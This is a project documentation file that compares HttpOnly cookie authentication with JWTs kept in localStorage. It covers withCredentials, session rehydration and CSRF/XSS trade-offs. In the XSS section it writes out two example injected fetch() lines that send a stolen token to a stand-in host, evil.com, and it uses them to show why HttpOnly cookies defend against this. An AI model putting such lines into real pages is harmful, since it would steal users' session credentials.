# Auth Architecture — HttpOnly Cookie vs JWT in localStorage

## The Core Difference: Who Holds the Token?

### JWT in localStorage (common pattern — NOT what this backend uses)

```
1. Login → server returns { token: "eyJhb..." }
2. Frontend stores it: localStorage.setItem("token", "eyJhb...")
3. Every request: Authorization: Bearer eyJhb...
4. Logout: localStorage.removeItem("token")
```

JavaScript owns the token. It can read it, copy it, and send it anywhere.

---

### HttpOnly cookie (what this backend uses)

```
1. Login → server returns 200 + Set-Cookie: __Host-Nexus-Auth=eyJhb...; HttpOnly
2. Browser stores it automatically — JS cannot read it at all
3. Every request: browser attaches cookie automatically (withCredentials: true)
4. Logout: POST /api/auth/logout → server clears the cookie
```

The **browser** owns the token. JavaScript cannot touch it — not even `document.cookie` can see it.

---

## Why HttpOnly Is Safer

The attack this prevents is **XSS (Cross-Site Scripting)**:

```js
// Attacker injects this script into your page:
fetch("https://evil.com/steal?token=" + localStorage.getItem("token"))
// → JWT stolen, attacker impersonates the user forever
```

With HttpOnly cookies, the same attack fails:

```js
fetch("https://evil.com/steal?token=" + document.cookie)
// → __Host-Nexus-Auth is invisible to JS → empty string → attack dead
```

---

## What `withCredentials: true` Does

By default, browsers don't send cookies on cross-origin requests. The frontend runs on `localhost:5173`, the API on `localhost:7289` — different ports = different origin.

```ts
// Without withCredentials — cookie NOT sent:
axios.get("https://localhost:7289/api/properties")

// With withCredentials — cookie IS sent automatically:
const api = axios.create({ withCredentials: true })
```

This single config change replaces the entire `Authorization: Bearer` interceptor. Every request behaves like a browser navigation — the cookie goes along automatically.

---

## Why No Zustand `persist` Middleware

In the localStorage approach, Zustand holds the token — so it must persist across page refreshes.

With cookies, the cookie survives refreshes on its own (the browser keeps it). Zustand only needs to know **who is logged in**, not the credential itself.

Rehydration flow on every app load:

```
App mounts
  → authStore.initialize() fires
  → GET /api/auth/me  (browser sends cookie automatically)
  → 200: set user = { userId, email }, isAuthenticated = true
  → 401: set user = null, isAuthenticated = false
  → isInitializing = false → app renders
```

> `AuthGuard` must wait for `isInitializing` to be false before redirecting. If it redirects to `/login` before `GET /me` finishes, every refresh would kick logged-in users out.

---

## The Trade-off: CSRF vs XSS

| Attack | localStorage + Bearer | HttpOnly cookie |
|---|---|---|
| XSS | Vulnerable — JS can steal the token | Safe — JS can't read the cookie |
| CSRF | Safe — Bearer must be set explicitly | Mitigated by `SameSite: Strict` |

`SameSite: Strict` means the cookie is only sent when the request originates from your own domain. A malicious third-party page cannot trigger requests with your cookie attached.

---

## Frontend State Shape

Because the token never reaches the frontend, the auth store holds only identity — not credentials:

```ts
// localStorage / Bearer approach:
{
  token: string | null,       // the JWT itself
  user: { id, email, name, role } | null,
  isAuthenticated: boolean,
}

// HttpOnly cookie approach (this project):
{
  user: { userId: string; email: string } | null,
  isAuthenticated: boolean,
  isInitializing: boolean,    // true while GET /me is in flight on app load
}
```

No token field. No persist. No interceptor injecting headers.

---

## Mental Model

> **localStorage auth:** "I carry my ID card and show it at every door."

> **HttpOnly cookie auth:** "The building gave me a wristband I can't remove or read — scanners see it automatically."

---

## See Also

- [`docs/backend-auth.md`](./backend-auth.md) — API endpoints, request/response shapes, error codes, cookie details
- [`docs/auth-summary.md`](./auth-summary.md) — original frontend auth system design notes (written before backend spec was known; some details are now superseded by this doc)
